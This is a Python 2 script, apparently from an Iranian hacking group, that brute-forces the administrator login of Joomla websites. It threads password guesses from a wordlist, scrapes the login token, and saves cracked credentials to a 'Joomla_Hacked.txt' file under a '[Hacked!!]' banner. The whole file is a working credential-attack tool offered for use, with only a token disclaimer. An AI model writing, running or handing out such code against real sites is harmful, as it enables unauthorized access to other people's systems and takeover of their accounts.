import threading, time, re, sys, os, random


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


try:
    import requests
except ImportError:
    cls()
    print '---------------------------------------------------'
    print '[*] pip install requests'
    print '   [-] you need to install requests Module'
    sys.exit()


class JooMLaBruteForce(object):
    def __init__(self):
        self.flag = 0
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        cls()
        self.print_logo()
        try:
            site = sys.argv[1]
            passwordlist = sys.argv[2]
            username = sys.argv[3]
            if site.startswith('http://'):
                site = site.replace('http://', '')
            elif site.startswith('https://'):
                site = site.replace('https://', '')
            else:
                pass
        except:
            cls()
            self.print_logo()
            print(self.c + '     Usage: {}'.format(self.w + 'python script.py Target.Com Password.txt Username') + self.rr)
            sys.exit()
        self.password = open(passwordlist, 'r').read().splitlines()
        thread = []
        for passwd in self.password:
            t = threading.Thread(target=self.Joomla, args=(site, passwd, username))
            if self.flag == 1:
                break
            else:
                t.start()
                thread.append(t)
                time.sleep(0.08)
        for j in thread:
            j.join()
        if self.flag == 0:
            print self.c + '       [' + self.r + '-' + self.c + '] ' + self.w + '[failed! Password Not Found]'

    def TimeStarT(self):
        return self.g + 'Time: ' + self.w + str(time.asctime()) + self.rr

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [37, 33, 32, 31]

        x = """
                     {}
                   _                       ____             _       
                  | |   Iran-cyber.Net    |  _ \           | |github.com/04x 
                  | | ___   ___  _ __ ___ | |_) |_ __ _   _| |_ ___ 
              _   | |/ _ \ / _ \| '_ ` _ \|  _ <| '__| | | | __/ _ |
             | |__| | (_) | (_) | | | | | | |_) | |  | |_| | ||  __/
              \____/ \___/ \___/|_| |_| |_|____/|_|   \__,_|\__\___|
                Note! : We don't Accept any responsibility for any illegal usage.    
    """.format(self.TimeStarT())
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))

    def Joomla(self, site, passwd, username):
        try:
            sess = requests.session()
            GetToken = sess.get('http://' + site + '/administrator/index.php', timeout=5)
            try:
                ToKeN = re.findall('type="hidden" name="(.*)" value="1"',
                                   GetToken.text.encode('utf-8'))[0]
                GeTOPtIoN = re.findall('type="hidden" name="option" value="(.*)"', GetToken.text.encode('utf-8'))[0]
            except:
                ToKeN = ''
                GeTOPtIoN = 'com_login'
            agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            post = {}
            post['username'] = username
            post['passwd'] = passwd
            post['lang'] = 'en-GB'
            post['option'] = GeTOPtIoN
            post['task'] = 'login'
            post[ToKeN] = '1'
            url = "http://" + site + "/administrator/index.php"
            print '  {} Trying:{} {}'.format(self.w, self.y, passwd)
            GoT = sess.post(url, data=post, headers=agent, timeout=10)
            if 'content-length' in GoT.headers and 'logout' not in GoT.text.encode('utf-8'):
                pass
            else:
                print self.c + '       [' + self.y + '+' + self.c + '] ' + \
                      self.r + site + ' ' + self.y + 'Joomla' + self.g + ' [Hacked!!]'
                print '              {}Username:{} {} \n              {}Password:{} {}'.format(self.c, self.y, 'admin', self.c, self.y, passwd)
                with open('Joomla_Hacked.txt', 'a') as writer:
                    writer.write('http://' + site + '/administrator/index.php' + '\n Username: admin' +
                                 '\n Password: ' + passwd + '\n-----------------------------------------\n')
                self.flag = 1
        except Exception, e:
            pass


JooMLaBruteForce()
